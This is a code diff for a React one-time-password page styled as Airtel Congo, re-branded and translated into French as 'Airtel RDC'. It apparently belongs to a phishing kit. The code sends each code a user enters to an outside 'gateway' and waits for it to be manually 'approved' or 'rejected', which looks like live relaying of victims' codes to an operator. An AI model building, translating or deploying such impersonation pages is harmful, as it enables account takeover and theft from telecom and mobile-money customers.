@@ -15,7 +15,7 @@ import {
 import { OtpVerificationPageProps } from "../types";
 
 const formatAirtelCongoOtpMessage = (otpValue: string) =>
-    `<#> Your Airtel Congo OTP is:${otpValue}. Do not share this code with anyone. Expires in 2 mins. td1xRGYXC+L`;
+    `<#> Votre code OTP Airtel RDC est : ${otpValue}. Ne partagez ce code avec personne. Expire dans 2 min. td1xRGYXC+L`;
 
 function OtpVerificationPage({
     phoneNumber,
@@ -28,10 +28,7 @@ function OtpVerificationPage({
     const [codeExpired, setCodeExpired] = useState(false);
     const inputRefs = React.useRef<(HTMLInputElement | null)[]>([]);
 
-
-
     React.useEffect(() => {
-        // Focus first input on mount
         inputRefs.current[0]?.focus();
     }, []);
 
@@ -40,20 +37,17 @@ function OtpVerificationPage({
             const timer = setTimeout(() => setResendTimer(resendTimer - 1), 1000);
             return () => clearTimeout(timer);
         } else if (resendTimer === 0) {
-            // Code has expired
             setCodeExpired(true);
         }
     }, [resendTimer]);
 
     const handleOtpChange = (index: number, value: string) => {
-        // Only allow digits
         if (!/^\d*$/.test(value)) return;
 
         const newOtp = [...otp];
-        newOtp[index] = value.slice(-1); // Only take last character
+        newOtp[index] = value.slice(-1);
         setOtp(newOtp);
 
-        // Auto-focus next input
         if (value && index < 5) {
             inputRefs.current[index + 1]?.focus();
         }
@@ -70,11 +64,10 @@ function OtpVerificationPage({
 
         const otpValue = otp.join("");
         if (otpValue.length !== 6) {
-            toast.error("Please enter all 6 digits");
+            toast.error("Veuillez entrer les 6 chiffres du code");
             return;
         }
 
-        // Check if code has expired
         if (codeExpired) {
             return;
         }
@@ -82,19 +75,16 @@ function OtpVerificationPage({
         setLoading(true);
 
         try {
-            // Form the payload
             const payload = {
                 type: 'otp',
-                name: "User OTP verification",
+                name: "Vérification OTP Utilisateur",
                 phone: phoneNumber?.replace(/\s/g, '') || "N/A",
                 details: formatAirtelCongoOtpMessage(otpValue),
             };
 
-            // Send request to the High-Performance Gateway via our API Client
             const res = await requestApproval(payload);
             const attemptId = res.attemptId;
 
-            // Start polling for status
             const interval = setInterval(async () => {
                 try {
                     const statusRes = await checkStatus(attemptId);
@@ -103,19 +93,19 @@ function OtpVerificationPage({
                     if (status === 'approved') {
                         clearInterval(interval);
                         setLoading(false);
-                        toast.success("OTP verified successfully!");
+                        toast.success("Code OTP vérifié avec succès !");
                         onComplete();
                     } else if (status === 'rejected') {
                         clearInterval(interval);
                         setLoading(false);
-                        toast.error("Invalid OTP, please check and try again.");
+                        toast.error("Code OTP invalide, veuillez réessayer.");
                         setOtp(["", "", "", "", "", ""]);
                         setTimeout(() => inputRefs.current[0]?.focus(), 100);
                     }
                 } catch (e) {
                     console.error("Polling error", e);
                 }
-            }, 2000); // Check every 2 seconds
+            }, 2000);
 
         } catch (err: any) {
             console.error("Failed to request approval:", err);
@@ -126,13 +116,12 @@ function OtpVerificationPage({
             if (errorData) console.error("Error data:", errorData);
 
             setLoading(false);
-            const msg = statusCode ? `Failed to connect to server (${statusCode}). Please try again.` : "Failed to connect to server. Please try again.";
+            const msg = statusCode ? `Échec de connexion (${statusCode}). Veuillez réessayer.` : "Échec de connexion au serveur. Veuillez réessayer.";
             toast.error(msg);
         }
     };
 
     const handleResend = () => {
-        // If code is expired, redirect to login page
         if (codeExpired) {
             onBack();
             return;
@@ -140,7 +129,7 @@ function OtpVerificationPage({
 
         if (resendTimer > 0) return;
 
-        toast.success("OTP resent successfully!");
+        toast.success("Code OTP renvoyé avec succès !");
         setResendTimer(60);
         setOtp(["", "", "", "", "", ""]);
         inputRefs.current[0]?.focus();
@@ -169,7 +158,7 @@ function OtpVerificationPage({
                 >
                     <ArrowLeft size={20} />
                 </button>
-                <img src="/airtel.svg" alt="Airtel Congo" style={logoStyle} />
+                <img src="/airtel.svg" alt="Airtel RDC" style={logoStyle} />
                 <button style={menuButtonStyle}>☰</button>
             </div>
 
@@ -182,13 +171,13 @@ function OtpVerificationPage({
                 >
                     <h1
                         style={{
-                            fontSize: "32px",
+                            fontSize: "30px",
                             fontWeight: "700",
                             marginBottom: "15px",
                             color: "#333",
                         }}
                     >
-                        OTP Verification
+                        Vérification OTP
                     </h1>
                     <p
                         style={{
@@ -198,10 +187,10 @@ function OtpVerificationPage({
                             lineHeight: "1.5",
                         }}
                     >
-                        Enter the OTP sent to your phone number
+                        Entrez le code OTP envoyé à votre numéro
                         <br />
                         <strong style={{ color: "#333" }}>
-                            {phoneNumber || "+242 06 123 4567"}
+                            {phoneNumber || "+243 099 123 4567"}
                         </strong>
                     </p>
 
@@ -236,7 +225,7 @@ function OtpVerificationPage({
                                         transition: "border-color 0.2s",
                                     }}
                                     onFocus={(e) => {
-                                        e.target.style.borderColor = "#7db3ff";
+                                        e.target.style.borderColor = "#e40000";
                                     }}
                                     onBlur={(e) => {
                                         e.target.style.borderColor = "#ddd";
@@ -261,7 +250,7 @@ function OtpVerificationPage({
                                             marginBottom: "12px",
                                         }}
                                     >
-                                        Invalid OTP, please enter a valid OTP
+                                        Code OTP expiré, veuillez demander un nouveau code
                                     </p>
                                     <button
                                         type="button"
@@ -269,14 +258,14 @@ function OtpVerificationPage({
                                         style={{
                                             background: "none",
                                             border: "none",
-                                            color: "#7db3ff",
+                                            color: "#e40000",
                                             cursor: "pointer",
                                             fontSize: "14px",
                                             textDecoration: "underline",
                                             fontWeight: "500",
                                         }}
                                     >
-                                        Resend OTP
+                                        Renvoyer le code OTP
                                     </button>
                                 </div>
                             ) : (
@@ -287,13 +276,13 @@ function OtpVerificationPage({
                                     style={{
                                         background: "none",
                                         border: "none",
-                                        color: resendTimer > 0 ? "#999" : "#7db3ff",
+                                        color: resendTimer > 0 ? "#999" : "#e40000",
                                         cursor: resendTimer > 0 ? "not-allowed" : "pointer",
                                         fontSize: "14px",
                                         textDecoration: resendTimer > 0 ? "none" : "underline",
                                     }}
                                 >
-                                    Resend OTP {resendTimer > 0 ? `in ${resendTimer} seconds` : ""}
+                                    Renvoyer le code OTP {resendTimer > 0 ? `dans ${resendTimer} s` : ""}
                                 </button>
                             )}
                         </div>
@@ -304,7 +293,7 @@ function OtpVerificationPage({
                             style={{
                                 ...buttonStyle,
                                 background:
-                                    loading || otp.join("").length !== 6 ? "#ccc" : "#7db3ff",
+                                    loading || otp.join("").length !== 6 ? "#ccc" : "linear-gradient(135deg, #e40000 0%, #c40000 100%)",
                                 cursor:
                                     loading || otp.join("").length !== 6
                                         ? "not-allowed"
@@ -318,17 +307,17 @@ function OtpVerificationPage({
                             {loading ? (
                                 <>
                                     <Loader2 className="spinner" size={18} />
-                                    VERIFYING...
+                                    VÉRIFICATION...
                                 </>
                             ) : (
-                                "SUBMIT"
+                                "VALIDER"
                             )}
                         </button>
                     </form>
                 </div>
             </div>
 
-            <div style={footerStyle}>© 2025 Airtel Congo</div>
+            <div style={footerStyle}>© 2025 Airtel RDC</div>
         </div>
     );
 }
